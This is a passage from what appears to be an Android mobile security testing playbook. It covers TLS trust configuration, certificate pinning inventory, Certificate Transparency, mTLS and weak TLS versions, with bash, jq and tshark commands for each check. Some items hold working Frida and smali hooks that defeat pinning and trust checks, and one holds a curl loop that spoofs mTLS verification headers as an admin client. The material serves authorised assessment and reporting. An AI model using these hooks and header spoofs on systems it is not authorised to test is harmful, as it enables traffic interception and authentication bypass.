    try: d=m.parse(f)
    except Exception: continue
    for c in d.getElementsByTagName('certificates'):
        p=c.parentNode.parentNode.nodeName
        print(p, 'src=', c.getAttribute('src'), 'overridePins=', c.getAttribute('overridePins') or 'false(default)')
PY
```
- **Proof:** Install your CA to the **user** store on a stock device, no root, no hooks — traffic to the
  pinned domain decrypts. Show the pin set in the same XML to make the contradiction explicit.
- **Escalation:** → D15. This is the shape that turns a P5 "pinning present" into a real transport
  finding, because the control is declared and simultaneously disabled.
- **Ruled out when:** `overridePins` is absent or `false` everywhere outside `<debug-overrides>`, and a
  user-store CA cannot intercept the pinned domain on a stock device.

### D14-030 · Custom trust anchor (`<certificates src="@raw/…"/>`) — and the Certificate Transparency it silently disables

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) |
| **Attacker** | AM-06 with a certificate from the bundled anchor's issuer; AM-09 |
| **Applies to** | NSC apps, API 24+. The CT caveat applies at every API level; CT itself is API 36+ |
| **Maps to** | Android NSC reference — "Certificate transparency verification is NOT performed on connections using custom trust anchors"; MASWE-0028, MASWE-0027 |

- **Test:** A bundled CA in `res/raw` replaces (not augments) the anchors for its scope. Two
  consequences: the private CA's issuance practices become the app's trust boundary, and **CT
  verification is not performed at all on that connection** — so a mis-issued certificate under that
  anchor is undetectable even on an API 37 device where CT is default-on.
- **How:**
```bash
grep -n 'src="@raw' apktool_out/res/xml/network_security_config.xml
ls apktool_out/res/raw/*.pem apktool_out/res/raw/*.crt apktool_out/res/raw/*.cer 2>/dev/null
for c in apktool_out/res/raw/*.{pem,crt,cer}; do [ -f "$c" ] && \
  openssl x509 -in "$c" -noout -subject -issuer -dates -text | grep -E 'Subject:|Issuer:|Not After|DNS:'; done
```
- **Proof:** The `src="@raw/…"` stanza, the certificate's Subject/Issuer/validity, and the domains it is
  scoped to. If the anchor has already expired, the scoped domains fail closed — capture that too, it is
  an availability finding the vendor will care about.
- **Escalation:** The bundled certificate's SANs frequently name internal hosts (→ D14-039, → D01). The
  CT gap pairs with D14-031 into one "mis-issuance would be undetectable" finding.
- **Ruled out when:** No `src="@raw"` anchor exists, or the anchor is scoped only to a non-production
  domain and the production `domain-config` uses `src="system"` with CT enabled.

### D14-031 · Certificate Transparency turned off per domain (API 36 opt-in, API 37 default-on)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES); pairs with `mobile_security_misconfiguration\|ssl_certificate_pinning\|absent` (P5) to argue an aggregate |
| **Attacker** | AM-06 holding a mis-issued certificate from any trusted CA |
| **Applies to** | `<certificateTransparency enabled>` is **not available ≤ API 35**, available and **disabled by default on API 36**, **enabled by default with opt-out at API 37+** |
| **Maps to** | Android NSC reference (`<certificateTransparency enabled>` and its per-API defaults; the custom-trust-anchor exclusion) |

- **Test:** A `domain-config` that sets `enabled="false"` for a sensitive domain is a deliberate removal
  of CT enforcement. Combined with no pin set, a single rogue or compromised CA is then sufficient to
  MitM with nothing to detect it after the fact.
- **How:**
```bash
grep -nE 'certificateTransparency|<certificates src=|overridePins|domainEncryption' apktool_out/res/xml/*.xml
grep -n 'networkSecurityConfig' apktool_out/AndroidManifest.xml
aapt2 dump badging base.apk | grep targetSdkVersion
```
- **Proof:** `<certificateTransparency enabled="false"/>` scoped to the API or auth domain, **or** a
  custom trust anchor for that domain (which disables CT regardless), together with the absence of a
  `<pin-set>` for the same domain.
- **Escalation:** → D14-034. Report the pair: no pinning *and* no CT on the auth domain is a genuinely
  weaker posture than either alone, and it is the honest way to give a P5 pinning observation weight.
- **Ruled out when:** `targetSdk ≤ 35` (the attribute does not exist, so there is nothing to opt out of
  — say so rather than calling it missing), or no `enabled="false"` appears and the production domain
  uses system anchors.

### D14-032 · `<domainEncryption mode="disabled"/>` — opting out of Encrypted Client Hello

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | no direct node; argue under `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) only where the hostname itself is the sensitive datum |
| **Attacker** | AM-06 performing traffic analysis |
| **Applies to** | `<domainEncryption mode>` defaults to **enabled at API 37+**, disabled at 36 and below |
| **Maps to** | Android NSC reference (`<domainEncryption mode>` and its per-API defaults) |

- **Test:** An app that pre-emptively sets `mode="disabled"` on its API domain opts out of SNI
  encryption, leaving the destination hostname visible on the wire.
- **How:**
```bash
grep -n 'domainEncryption' apktool_out/res/xml/*.xml
tshark -r cap.pcap -Y 'tls.handshake.type==1' -T fields -e tls.handshake.extensions_server_name | sort -u
```
- **Proof:** The `mode="disabled"` stanza scoped to a first-party domain, plus the plaintext SNI values
  in the ClientHello capture.
- **Escalation:** → D20 traffic-analysis privacy. Report it only where the hostname itself discloses
  something — health, dating, whistleblowing, political, HIV/addiction services — otherwise it is noise.
- **Ruled out when:** No `domainEncryption` element exists (the API 37+ default applies) or `targetSdk`
  is below 37 so the attribute is inert.

### D14-033 · Interception-detection (RASP) reading the wrong trust-store path on API 34+

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `lack_of_binary_hardening\|runtime_instrumentation_based` (P5) — resilience only |
| **Attacker** | AM-12 own rooted device (**not an attack**) |
| **Applies to** | API 34+, apps that enumerate or hash the system trust store to detect interception |
| **Maps to** | AOSP Conscrypt module (`source.android.com/docs/core/ota/modular-system/conscrypt` — "Android 14 introduced updatable root certificates… stored in the Conscrypt module APEX and the system partition"; paths `/apex/com.android.conscrypt/cacerts` and `/system/etc/security/cacerts`; APEX package `com.android.conscrypt`) |

- **Test:** An app that detects MitM by enumerating `/system/etc/security/cacerts` is reading a path the
  runtime ignores on API 34+. The check is bypassed by construction: install into the APEX path only and
  the detector sees a clean store.
- **How:**
```bash
grep -rn '/system/etc/security/cacerts\|cacerts\|KeyStore.getInstance("AndroidCAStore")\|TrustedCertificateStore' jadx_out/sources/
adb shell ls /system/etc/security/cacerts | wc -l
adb shell ls /apex/com.android.conscrypt/cacerts | wc -l
frida-trace -U -f <pkg> -j '*!*cacert*' -j '*!*TrustedCertificate*'
```
- **Proof:** A Frida trace showing the app stat-ing or listing only `/system/etc/security/cacerts`,
  while interception succeeds through the APEX path.
- **Escalation:** Enables your own harness (→ D26). It is **not** a reportable finding on its own — it
  is a resilience observation and belongs in the graveyard unless the client's scope explicitly buys
  MAS-R controls.
- **Ruled out when:** The app performs no trust-store enumeration at all, or it reads
  `/apex/com.android.conscrypt/cacerts` (or uses `TrustedCertificateStore`/`AndroidCAStore`, which
  resolve correctly on every level).

### D14-034 · Pinning inventory, per host, per stack — the P5 item that steers everything else

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `mobile_security_misconfiguration\|ssl_certificate_pinning\|absent` (**P5**) / `\|defeatable` (**P5**) — never file standalone |
| **Attacker** | AM-07 (tester convenience, not an attacker) |
| **Applies to** | NSC pinning from API 24; NSC pins cover framework traffic (`HttpsURLConnection`, WebView) but **not** native-code connections |
| **Maps to** | MASTG-TEST-0242, MASTG-TEST-0244, MASWE-0028, MASTG-KNOW-0015, MASVS-NETWORK-2 (an L2 control), prerequisite `identify-first-party-domains`; HackerOne Platform Standards demotion rule; Bugcrowd VRT both nodes P5 |

- **Test:** Build a host-by-host table: pinned / unpinned / bypassed-with-which-hook, and the mechanism
  (NSC `<pin-set>`, OkHttp `CertificatePinner`, TrustKit, Cronet `setPublicKeyPins`, a custom
  `TrustManager`, native BoringSSL). MASTG-TEST-0242 and -0244 both insist the finding applies **only to
  first-party domains under the developer's control** — do not report an unpinned third-party CDN.
- **How:**
```bash
yq -p=xml -o=json '.' apktool_out/res/xml/network_security_config.xml > nsc.json
jq -r '.["network-security-config"]["domain-config"][]
       | select(.["pin-set"] != null)
       | .domain | if type == "object" then .["+content"] else . end' nsc.json
grep -rn 'CertificatePinner\|certificatePinner(\|sha256/\|pinnedCertificates\|TrustKit\|setPublicKeyPins\|X509TrustManagerExtensions' jadx_out/sources/
rabin2 -zz lib/*/*.so | grep -iE 'sha256/|pinning|pin_set'
# static mapper that prints file:line per implementation
python sslpindetect.py -a apktool_2.11.0.jar -f base.apk -v
```
  Runtime, implementation-agnostic (MASTG-TEST-0244): with the system CA correctly installed per
  D14-002, see which hosts still fail and correlate with the logcat marker from D14-003.
- **Proof:** The table. For each pinned host: the `<pin-set>` or `CertificatePinner` call site and the
  `I/X509Util: … Pin verification failed` line. For each unpinned host: the decrypted flow.
- **Escalation:** Two things in this table are worth money and nothing else is: an **expired** pin set
  (→ D14-035) and an **unpinned host that carries user identifiers or auth material** (→ D14-036).
  Everything else is context for D15.
- **Ruled out when:** Not applicable as a negative — this item always produces an inventory. What is
  ruled out is the *finding*: "pinning absent on first-party hosts, no interceptable secret found,
  no realistic AM-06 path" goes to the ruled-out register, never to the report.

### D14-035 · Expired `<pin-set expiration="…">` — pinning that silently stopped being enforced

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `mobile_security_misconfiguration\|ssl_certificate_pinning\|absent` (P5) at base — argue up only with an interception impact; the reporting angle is the lapsed control |
| **Attacker** | AM-06 with a certificate from any trusted CA (the fallback is the configured trust anchors) |
| **Applies to** | all NSC-pinning apps, API 24+ |
| **Maps to** | MASTG-TEST-0243, MASWE-0028, MASTG-KNOW-0014, MASTG-KNOW-0015; MobSF `network_security.py` "Certificate pinning expires on {exp}. After this date pinning will be disabled." |

- **Test:** Once past the `expiration` date Android **stops enforcing that pin set** and falls back to
  the configured trust anchors. MASTG notes the behaviour is deliberate, "to prevent connectivity issues
  in apps which do not get updates to their pin set" — which is exactly why the developer believes
  pinning is still on when it is not.
- **How:**
```bash
yq -p=xml -o=json '.' apktool_out/res/xml/network_security_config.xml | \
  jq -r '.["network-security-config"]["domain-config"][]? | {domain, exp: .["pin-set"]["+@expiration"]}'
date -u +%Y-%m-%d
```
  MobSF's own convention is useful framing: a `pin-set` with **no** expiration is the secure case; one
  **with** an expiration is at best informational and, once past, is effectively unpinned.
- **Proof:** An `expiration` date in the past on a first-party `<domain-config>`, plus successful
  interception of that exact domain on a device whose clock is current — the pair is what distinguishes
  this from an ordinary P5 pinning note.
- **Escalation:** Same as missing pinning, but with a stronger narrative: the control is declared,
  budgeted and believed-in, and it lapsed. That framing is what gets a P5 read at P4/P3 on some programs.
- **Ruled out when:** Every `<pin-set>` either has no `expiration` attribute or a future-dated one —
  record the dates, because a pin set expiring inside the client's release cadence is worth a sentence.

### D14-036 · Pin scope error: first-party pinned, an SDK/analytics host unpinned and carrying identifiers

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) when the unpinned channel carries identifiers; `sensitive_data_exposure\|disclosure_of_secrets\|pii_leakage_exposure` (VARIES) |
| **Attacker** | AM-06 |
| **Applies to** | all apps that pin selectively — which is nearly all of them |
| **Maps to** | MASTG-TEST-0242's first-party scoping rule, MASWE-0028; corpus worked calibration: a payment SDK pinning **its own** traffic while the app's main API was interceptable with a system-trusted CA |

- **Test:** Pinning is almost always declared per-domain. Enumerate the hosts that are *not* in the pin
  set and read what they carry. The paying version of this item is not "the CDN is unpinned" — it is
  "the unpinned channel carries the user id, the advertising id, the device fingerprint, or a
  replayable identifier", or "the pinned host is the SDK's and the unpinned host is the app's own API".
- **How:**
```bash
# hosts in the pin set:
jq -r '.["network-security-config"]["domain-config"][]? | select(.["pin-set"]) | .domain' nsc.json | sort -u > pinned.txt
# hosts actually contacted (from D14-004):
sort -u proxy_hosts.txt pcap_hosts.txt > contacted.txt
comm -13 pinned.txt contacted.txt        # contacted but never pinned
```
  Then, for each unpinned host, read the request bodies and headers in the proxy.
- **Proof:** A decrypted request to an unpinned host containing a stable user identifier, a session
  value, or PII — with the pin set for the sibling host shown alongside, proving the omission was a
  choice.
- **Escalation:** → D20 (identifiers to a processor), → D18 (SDK inventory), → D15 if the identifier is
  replayable against the first-party API.
- **Ruled out when:** Every contacted first-party host appears in the pin set, and every unpinned host
  is a third-party static asset endpoint whose requests carry no cookie, no identifier and no token —
  show the request set.

### D14-037 · The pin set an SDK's own HTTP stack never consults

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) — rate on the channel contents |
| **Attacker** | AM-06 |
| **Applies to** | apps bundling a native HTTP client (`libcurl`, BoringSSL, mbedTLS, nghttp2), Cronet, gRPC, or a cross-platform stack |
| **Maps to** | MASWE-0028; the NSC's documented scope (framework traffic only — not native-code connections) |

- **Test:** The app declares pins in the NSC or with `CertificatePinner`, but an SDK uses its own socket
  layer that consults neither. The vendor believes the whole app is pinned; in practice an entire class
  of traffic is not.
- **How:**
```bash
unzip -o base.apk 'lib/*' -d x
for so in x/lib/*/*.so; do strings -a "$so" | grep -aqiE 'libcurl|boringssl|mbedtls|nghttp2|cronet' \
  && echo "NATIVE HTTP: $so"; done
grep -rn 'CertificatePinner\|pin-set\|certificateTransparency' jadx_out/sources/ apktool_out/res/xml/ \
  | grep -viE '^(jadx_out/sources/(android|androidx))/'
# then: system CA installed, Java-layer unpinning ONLY, and see which hosts still appear
frida -U -f <pkg> --codeshare akabe1/frida-multiple-unpinning
```
- **Proof:** Burp showing SDK traffic to a third-party host decrypted while the app's own API host stays
  pinned — and better, that SDK traffic carrying a session or user identifier.
- **Escalation:** → D20 (PII in the clear to a third party), → D15 (replayable identifiers), → D19 for
  the cross-platform variants.
- **Ruled out when:** No native HTTP library ships in `lib/`, or the native stack's destinations are all
  present in the pin set and fail closed under interception.

### D14-038 · The pinning-bypass ladder — technique, not a finding

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `mobile_security_misconfiguration\|ssl_certificate_pinning\|defeatable` (**P5**) — record, do not file |
| **Attacker** | AM-07/AM-12 (tester) |
| **Applies to** | all pinned apps |
| **Maps to** | MASTG-TECH-0012, MASTG-TOOL-0140 (frida-multiple-unpinning), MASTG-TOOL-0038/-0029 (objection), MASTG-TOOL-0025 (SSLUnpinning), MASTG-TOOL-0020 (JustTrustMe), MASTG-TOOL-0008 (Android-SSL-TrustKiller), MASTG-TOOL-0100 (reFlutter), MASTG-TOOL-0101 (disable-flutter-tls-verification), MASTG-TOOL-0103 (uber-apk-signer), MASTG-TECH-0039 |

- **Test:** Work the ladder in order of effort, and **record which hook fired** — that names the pinning
  stack, which is the one genuinely useful output of this item.
```
1  objection      android sslpinning disable
2  Frida Java     akabe1/frida-multiple-unpinning  |  pcipolloni re-pinning to YOUR CA
3  Frida native   SSL_CTX_set_custom_verify / ssl_verify_peer_cert  (BoringSSL, Cronet, Flutter, Go)
4  Framework      reFlutter; Xamarin dnSpy IL patch; RN dev-bundle
5  Static         smali method-body replacement, then repack + re-sign
6  Config         repack with a permissive NSC (no root needed)
```
- **How:**
```bash
objection -g <pkg> explore -s "android sslpinning disable"
frida -U -f <pkg> --codeshare akabe1/frida-multiple-unpinning --no-pause
frida -U -f <pkg> -l config.js -l native-connect-hook.js -l native-tls-hook.js \
  -l android-proxy-override.js -l android-system-certificate-injection.js \
  -l android-certificate-unpinning.js -l android-certificate-unpinning-fallback.js
```
```javascript
// the two hooks that cover most Java stacks
Java.perform(function () {
  try { var P = Java.use('okhttp3.CertificatePinner');
        P.check.overload('java.lang.String','java.util.List').implementation = function(){};
        P.check$okhttp.implementation = function(){}; } catch(e){}
  try { var T = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        T.checkTrustedRecursive.implementation = function(){ return Java.use('java.util.ArrayList').$new(); };
        T.verifyChain.implementation = function(chain){ return chain; }; } catch(e){}
  try { var C = Java.use('org.chromium.net.impl.CronetEngineBuilderImpl'); } catch(e){}
});
// native layer, when Java hooks change nothing
var cv = Module.findExportByName(null, 'SSL_CTX_set_custom_verify');
if (cv) Interceptor.attach(cv, { onEnter: function (args) { args[1] = ptr(0); } });  // SSL_VERIFY_NONE
```
  Static fallbacks:
```bash
grep -ri "sha256\|sha1" ./smali                                   # pinned digests
find ./assets -type f \( -iname \*.cer -o -iname \*.crt \)        # embedded certs
find ./ -type f \( -iname \*.jks -o -iname \*.bks \)              # truststores
keytool -importcert -v -trustcacerts -file proxy.cer -alias aliascert \
  -keystore "res/raw/truststore.bks" \
  -provider org.bouncycastle.jce.provider.BouncyCastleProvider \
  -providerpath "providerpath/bcprov-jdk15on-164.jar" -storetype BKS -storepass <password>
grep -ri 'java/lang/String;\[Ljava/lang/String;)L' ./             # obfuscated CertificatePinner.Builder.add
```
```smali
.method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
  .registers 2
  return-void
.end method
```
  **mTLS caveat:** replace **only** the `TrustManager[]`, keep the original `KeyManager[]` — replacing
  both stops the app sending its client certificate and the handshake still fails, which reads as
  unbypassable pinning.
- **Proof:** Decrypted first-party traffic plus the console line naming the hooked class (e.g.
  `Found okhttp3.CertificatePinner, overriding CertificatePinner.check()`). Quote it verbatim; it
  identifies the library family.
- **Escalation:** Unlocks all of D15. Note the costs of the repack route: the signature changes, existing
  sessions are lost, Play Integrity `appRecognitionVerdict` stops being `PLAY_RECOGNIZED`, and any
  self-signature check fires (→ D21).
- **Ruled out when:** Not applicable — but a finding demonstrated **only after you disabled the client's
  own control must say so in the report**, because the client's risk picture includes how hard the
  control was to defeat.

### D14-039 · Pinned certificates in `assets/` disclose unadvertised internal hosts

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | rated on the discovered host — up to `sensitive_data_exposure\|disclosure_of_secrets\|for_internal_asset` (P3) or beyond |
| **Attacker** | AM-01 once the host is reachable |
| **Applies to** | apps that pin with bundled certificates |
| **Maps to** | corpus `apk-redteam-pipeline` Stage 4 + decision-tree row "Pinned cert for internal host → new asset discovery" |

- **Test:** A bundled `.cer`/`.der`/`.pem`/`.crt` names the host it pins in its Subject and SANs. That
  host is real by construction, even when passive recon never surfaced it.
- **How:**
```bash
find apktool_out/assets apktool_out/res/raw -type f \
  \( -iname "*.cer" -o -iname "*.der" -o -iname "*.pem" -o -iname "*.crt" -o -iname "*.bks" -o -iname "*.jks" \)
for cert in $(find apktool_out -iname "*.cer" -o -iname "*.pem" -o -iname "*.crt"); do
  echo "== $cert"
  openssl x509 -in "$cert" -noout -subject -issuer -dates 2>/dev/null || \
  openssl x509 -inform DER -in "$cert" -noout -subject -issuer -dates
  openssl x509 -in "$cert" -noout -text 2>/dev/null | grep -E 'DNS:|IP Address:'
done
keytool -list -v -keystore apktool_out/res/raw/truststore.bks -storetype BKS -storepass '' 2>/dev/null | grep -E 'Owner|DNS'
```
  The engagement example from the corpus: `assets/api_<service>_<domain>_com.cer` revealed an
  `api.<service>.<domain>` asset absent from passive recon.
- **Proof:** A Subject or SAN naming a host that is not in your recon inventory, then confirmed live
  (`dig`, then a TLS handshake and a request).
- **Escalation:** → D01. Feed the name into a certificate-transparency search for siblings, then sweep
  the new host for unauthenticated routes (→ D15).
- **Ruled out when:** No certificate or truststore ships in `assets/`/`res/raw`, or every Subject/SAN in
  them is already in the scope inventory.

### D14-040 · mTLS: client-certificate handling, and the edge-terminated verdict header

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (**P1**) if the spoofed verdict yields a privileged action; High as filed when only privileged *data* is shown |
| **Attacker** | AM-01 (the header spoof needs no network position at all) |
| **Applies to** | mTLS-fronted mobile backends terminating at nginx/HAProxy/Envoy |
| **Maps to** | corpus `hunt-tls-network` Phase 8 + chain table ("High, not Critical" without a demonstrated privileged action); CWE-290-class trust-of-header |

- **Test:** Two halves. (a) Client-side: where does the client certificate and its passphrase live, and
  is it extractable? (b) Server-side: edges commonly terminate mTLS and forward the verdict as a request
  header the backend trusts. If the edge does not strip client-supplied copies, you spoof a verified
  client with plain curl and no certificate at all.
- **How:**
```bash
# (a) client side
grep -rn 'KeyManagerFactory\|PKCS12\|\.p12\|\.pfx\|setClientCertificate\|onReceivedClientCertRequest\|KeyChain' jadx_out/sources/
find apktool_out -iname '*.p12' -o -iname '*.pfx' -o -iname '*.bks'
# (b) edge verdict header spoof
for combo in \
  "X-SSL-Client-Verify: SUCCESS|X-SSL-Client-S-DN: CN=admin" \
  "ssl-client-verify: SUCCESS|ssl-client-subject-dn: CN=admin" \
  "X-Client-Verify: SUCCESS|X-Client-DN: CN=admin,O=target" \
  "X-Forwarded-Client-Cert: By=spiffe://x;Hash=0;Subject=\"CN=admin\""; do
  H1="${combo%%|*}"; H2="${combo##*|}"
  curl -sk "https://$TARGET/internal/api" -H "$H1" -H "$H2" -o /dev/null -w "%{http_code} $H1\n"
done
# also sweep paths that commonly skip mTLS entirely:
for p in /health /ping /status /metrics /api/health; do
  curl -sk -o /dev/null -w "%{http_code} $p\n" "https://$TARGET$p"; done
```
- **Proof:** A **403 flipping to 200 with authenticated-only content** — not a generic page. Apply the
  Body-Diff Rule: if with-header and without-header both return 200 **and the bodies are byte-identical**,
  the path was never protected and there is no finding.
- **Escalation:** → D15 internal API surface. If the client certificate is extractable from the APK, that
  is a separate D18/D22 primitive — file it separately and cross-reference.
- **Ruled out when:** The edge strips every known verdict-header spelling (all probes return the baseline
  403/401 with identical bodies), and the client certificate is generated on-device and stored in the
  Android Keystore rather than shipped in the APK.

### D14-041 · Insecure TLS versions explicitly enabled in code

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `server_security_misconfiguration\|insecure_ssl\|insecure_cipher_suite` (**P5**) / `\|lack_of_forward_secrecy` (**P5**) — the client-side node is a graveyard entry unless paired with an observed session (D14-042) |
| **Attacker** | AM-06 with a downgrade-capable position and a cooperating server |
| **Applies to** | all. The NSC gives **no** control over TLS versions on Android (unlike iOS ATS) — it is all code-level. TLS 1.3 is on by default from Android 10 |
| **Maps to** | MASTG-TEST-0217, MASWE-0026, CWE-319; mobsfscan `insecure_tls_version`, `weak_tls_cipher_suite`, `insecure_sslv3`, `default_http_client_tls` ("`DefaultHTTPClient()` with default constructor is not compatible with TLS 1.2") |

- **Test:** Apps re-enable old versions through `SSLContext.getInstance("TLSv1.1")`,
  `SSLSocket.setEnabledProtocols(...)`, or library configuration. MASTG names OkHttp's
  `ConnectionSpec.COMPATIBLE_TLS` specifically as a setting that "can lead to insecure TLS versions,
  like TLS 1.1, being enabled by default in certain versions".
- **How:**
```bash
grep -rnE 'SSLContext\.getInstance\("(SSL|SSLv3|TLSv1|TLSv1\.1)"\)' jadx_out/sources/
grep -rn 'setEnabledProtocols\|setEnabledCipherSuites' jadx_out/sources/ -A8
grep -rn 'ConnectionSpec\.COMPATIBLE_TLS\|ConnectionSpec\.MODERN_TLS\|connectionSpecs(\|tlsVersions(\|cipherSuites(' jadx_out/sources/
grep -rn 'DefaultHttpClient' jadx_out/sources/
```
  Also flag any explicit cipher list containing `NULL`, `anon`, `EXPORT`, `DES`, `RC4` or `MD5` suites.
- **Proof:** The enabled-protocol or cipher list at the call site, confirmed by the negotiated version in
  a capture (D14-042). The code site alone is not a finding on most programs.
- **Escalation:** Only meaningful when it enables a downgrade to an interceptable or attackable session —
  otherwise it belongs in the graveyard table with the reason stated.
- **Ruled out when:** No explicit protocol or cipher list is set anywhere, the app uses
  `ConnectionSpec.MODERN_TLS` or the platform default, and `targetSdk ≥ 35` (Android 15 disallows TLS
  1.0/1.1 for apps targeting it, via Conscrypt).

### D14-042 · Negotiated TLS version and cipher observed in live traffic

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `server_security_misconfiguration\|insecure_ssl\|insecure_cipher_suite` (P5) — a server-side report, not a mobile one |
| **Attacker** | AM-06 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0218, MASWE-0026, MASTG-TECH-0010, MASTG-TOOL-0081 |

- **Test:** Version negotiation is a client/server agreement — only a capture shows what is actually
  used. This item exists mainly to stop you filing D14-041 on its own.
- **How:**
```bash
adb shell su -c '/data/local/tmp/tcpdump -i any -s0 -w /sdcard/t.pcap'
adb pull /sdcard/t.pcap
tshark -r t.pcap -Y 'tls.handshake.type==1' -T fields -e tls.handshake.version -e tls.handshake.extensions_supported_version
tshark -r t.pcap -Y 'tls.handshake.type==2' -T fields -e tls.handshake.version -e tls.handshake.ciphersuite
nmap --script ssl-enum-ciphers -p 443 api.target.tld
```
  Wireshark filters: `tls.handshake.type == 1` (ClientHello — inspect `supported_versions`) and
  `tls.record.version`.
- **Proof:** A **ServerHello** showing TLS 1.0 or 1.1, or a CBC/RC4 suite, for a first-party host —
  i.e. a completed handshake, not merely an offered version.
- **Escalation:** This feeds the *server-side* report; on a mobile program it is usually out of scope
  (HackerOne "SSL/TLS Configurations", Grab "weak TLS/SSL versions & ciphers", Basecamp "unless you have
  a working proof of concept").
- **Ruled out when:** Every observed ServerHello for a first-party host is TLS 1.2 or 1.3 with an AEAD
  suite — say so with the tshark output and close the class.

### D14-043 · A bundled TLS stack that the Android 15 protocol floor does not reach

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) when the weak session carries data |
| **Attacker** | AM-06 |
| **Applies to** | apps shipping their own OpenSSL/BoringSSL/Conscrypt-standalone/mbedTLS in a `.so`, or a cross-platform framework's stack. The platform floor binds at `targetSdk 35`; bundled stacks are unaffected on **every** version |
| **Maps to** | AOSP Conscrypt module ("Android 15 now disallows TLS 1.0 and 1.1 for apps targeting that version"), developer.android.com Android 15 behaviour changes "Restricted TLS Versions"; MASWE-0026 |

- **Test:** An app that needs a legacy endpoint on a modern target must have installed a custom socket
  factory or bundled its own TLS stack. Find it — and note that such a stack frequently ships a
  permissive trust manager alongside, which is the actual finding.
- **How:**
```bash
unzip -l base.apk | grep -iE 'conscrypt|openssl|boringssl|libssl|mbedtls'
strings -a apktool_out/lib/arm64-v8a/*.so | grep -iE 'TLSv1|OpenSSL [0-9]|BoringSSL|mbed TLS' | sort -u
grep -rn 'SSLContext.getInstance\|setEnabledProtocols\|ConnectionSpec\|SSLSocketFactory\|Conscrypt.newProvider' jadx_out/sources/
grep -rn 'X509TrustManager\|HostnameVerifier\|checkServerTrusted' jadx_out/sources/ -A6   # the co-located defect
openssl s_client -connect api.target.tld:443 -tls1_1 </dev/null 2>&1 | grep -E 'Protocol|Cipher'
```
- **Proof:** A captured handshake showing the app completing a TLS 1.0/1.1 session on a device where the
  platform would have refused it — plus the bundled stack's version string.
- **Escalation:** → D19 (cross-platform frameworks are the usual cause), → D14-007 if the same stack
  carries a permissive trust manager.
- **Ruled out when:** No bundled TLS library ships in `lib/`, and every observed handshake is TLS 1.2+.

### D14-044 · GMS Security Provider not updated, updated too late, or with the failure swallowed

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | no dedicated node; often **Informational** under HackerOne rating (a defence-in-depth measure) |
| **Attacker** | AM-06 against a device with an unpatched provider |
| **Applies to** | apps shipping with Google Play Services; meaningful mainly where `minSdkVersion` is low |
| **Maps to** | MASTG-TEST-0295, MASWE-0027, MASTG-KNOW-0010, MASTG-KNOW-0011, MASTG-BEST-0020 |

- **Test:** Three failure modes, and MASTG makes the ordering explicit — "Check that these calls occur
  before any network connections are made": (a) no `ProviderInstaller` reference at all; (b) a call whose
  exception handler is empty; (c) a call made *after* networking has already started.
- **How:**
```bash
grep -rnE 'ProviderInstaller\.(installIfNeeded|installIfNeededAsync)|ProviderInstallListener|GooglePlayServicesNotAvailableException|GooglePlayServicesRepairableException' jadx_out/sources/ -A8
```
  Confirm the ordering at runtime by timestamping both events:
```javascript
Java.perform(function () {
  try { var PI = Java.use('com.google.android.gms.security.ProviderInstaller');
        PI.installIfNeeded.implementation = function (c) {
          console.log('[ProviderInstaller.installIfNeeded] t=' + Date.now());
          return this.installIfNeeded(c); };
  } catch (e) { console.log('ProviderInstaller absent'); }
  var U = Java.use('java.net.URL');
  U.openConnection.overload().implementation = function () {
    console.log('[URL.openConnection] t=' + Date.now() + ' ' + this.toString());
    return this.openConnection(); };
});
```
- **Proof:** A network-connection timestamp **preceding** the `installIfNeeded` timestamp, an empty
  `catch` block at the call site, or no reference at all on an app whose `minSdkVersion` is low.
- **Escalation:** Pair with D14-027 (low `minSdkVersion`) as one "the app supports legacy devices and
  does not harden their TLS stack" finding, rated on the app's risk class. Standalone it is Low and
  frequently Informational.
- **Ruled out when:** `installIfNeeded`/`installIfNeededAsync` runs on the first-launch path before any
  connection (proved by the timestamps), with a handler that surfaces
  `GooglePlayServicesRepairableException`/`NotAvailableException` rather than swallowing it — or
  `minSdkVersion` is high enough that the provider is current on every supported device.

### D14-045 · Custom DNS resolution bypassing Private DNS, and behaviour under a hijacked name

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES); `server_security_misconfiguration\|misconfigured_dns\|subdomain_takeover` (P3) if the hijack is achieved by a dangling record rather than by network position |
| **Attacker** | AM-06 controlling DHCP/DNS on the same network |
| **Applies to** | all. Android supports DNS-over-TLS from SDK 28 and DoH3 from SDK 30; DNS resolution is the `com.android.resolv` Mainline module |
| **Maps to** | Google risk `bad-dns` (names `DnsResolver`, DoT at SDK 28+, DoH3 at SDK 30+, and the anti-patterns "Implement custom DNS resolution logic", "Configure hardcoded DNS servers", "Use unencrypted DNS (plain UDP port 53)"); ATT&CK T1638; MASWE-0026 |

- **Test:** Two things. (a) Does the app resolve through its own resolver, bypassing the user's Private
  DNS setting? (b) When a hostname resolves elsewhere, what does the app do — fall back to HTTP on TLS
  failure, accept a certificate for a different name because the verifier is lax only on a secondary
  host, or fetch config/assets from the hijacked name?
- **How:**
```bash
